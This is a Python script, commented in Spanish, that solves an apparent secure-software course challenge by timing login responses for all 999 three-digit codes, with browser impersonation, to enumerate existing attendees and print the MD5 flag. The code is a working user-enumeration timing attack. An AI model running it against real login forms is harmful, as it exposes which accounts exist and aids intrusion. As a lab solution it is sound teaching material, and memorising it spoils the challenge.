"""
Timing attack para el lab de asistencias.

- Codigo de 3 digitos -> 1000 combinaciones (000 a 999).
- La clave NO importa (se deja fija).
- Los codigos de asistentes reales hacen que el servidor tarde ~1s;
  los que no existen responden en ~0.2s. La diferencia es enorme.
- Contamos los que superan el umbral -> cantidad de asistentes.
- MD5 de ese numero = respuesta del desafio.

IMPORTANTE sobre el umbral: no se pone en un numero fijo (1 segundo),
se pone en el "hueco" real que separa los rapidos de los lentos. Este
script lo detecta solo, pero tambien podes fijarlo a mano en UMBRAL.

Uso: python timing_attack_v2.py
Guarda toda la evidencia en resultado.txt
"""

import hashlib
import time

from curl_cffi import requests

BASE_URL = "https://chl-e2436c36-7a76-4c16-bddb-fb0537ebc25d-asistencia.softwareseguro.com.ar/index.php"

HEADERS = {
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "es-ES,es;q=0.9,en-US;q=0.8,en;q=0.7",
    "Origin": "https://chl-e2436c36-7a76-4c16-bddb-fb0537ebc25d-asistencia.softwareseguro.com.ar",
    "Referer": "",
    "Cookie": "",
}

CLAVE_FIJA = "gochip"
# Umbral en segundos. 0.8 cae en el hueco entre los rapidos (~0.2s) y los
# lentos (~1s). Si tu corrida tiene el hueco en otro lado, ajustalo mirando
# los "30 mas lentos" que imprime al final.
UMBRAL = 0.8
TIMEOUT = 15
ARCHIVO_SALIDA = "resultado.txt"


def medir(log):
    session = requests.Session(impersonate="firefox135")
    resultados = []
    # Arrancamos en 1 (no en 0): en produccion los IDs de cuenta empiezan
    # en 1, asi que el codigo 000 no corresponde a ningun asistente real.
    # Esto ademas evita contar un falso positivo de red que a veces cae en 000.
    for n in range(1, 1000):
        codigo = f"{n:03d}"
        inicio = time.perf_counter()
        try:
            session.post(BASE_URL, data={"codigo": codigo, "clave": CLAVE_FIJA},
                         headers=HEADERS, timeout=TIMEOUT)
            seg = time.perf_counter() - inicio
        except Exception as e:
            log(f"codigo={codigo} -> ERROR: {e}")
            continue
        resultados.append((codigo, seg))
        marca = "  <-- LENTO (asistente)" if seg > UMBRAL else ""
        log(f"codigo={codigo}  {seg:.3f}s{marca}")
    return resultados


def resumen(resultados, log):
    lentos = sorted(c for c, s in resultados if s > UMBRAL)
    total = len(lentos)

    log("\n--- Los 30 mas lentos (confirma que hay un salto claro) ---")
    for c, s in sorted(resultados, key=lambda r: r[1], reverse=True)[:30]:
        log(f"  codigo={c}  {s:.3f}s")

    log(f"\nUmbral usado: {UMBRAL}s")
    log(f"Cantidad de asistentes (codigos > umbral): {total}")
    log(f"Codigos de los asistentes: {lentos}")
    if total > 200:
        log("OJO: supera 200, el enunciado dice que no deberia. Revisa el umbral.")

    md5 = hashlib.md5(str(total).encode()).hexdigest()
    log(f"\n==========================================")
    log(f"  CANTIDAD DE ASISTENTES: {total}")
    log(f"  MD5({total}) = {md5}  <-- ESTE ES EL CODIGO DEL DESAFIO")
    log(f"==========================================")


if __name__ == "__main__":
    # log() imprime en pantalla Y guarda en resultado.txt al mismo tiempo
    f = open(ARCHIVO_SALIDA, "w", encoding="utf-8")

    def log(msg):
        print(msg)
        f.write(msg + "\n")

    resumen(medir(log), log)
    f.close()
    print(f"\n(Evidencia completa guardada en {ARCHIVO_SALIDA})")
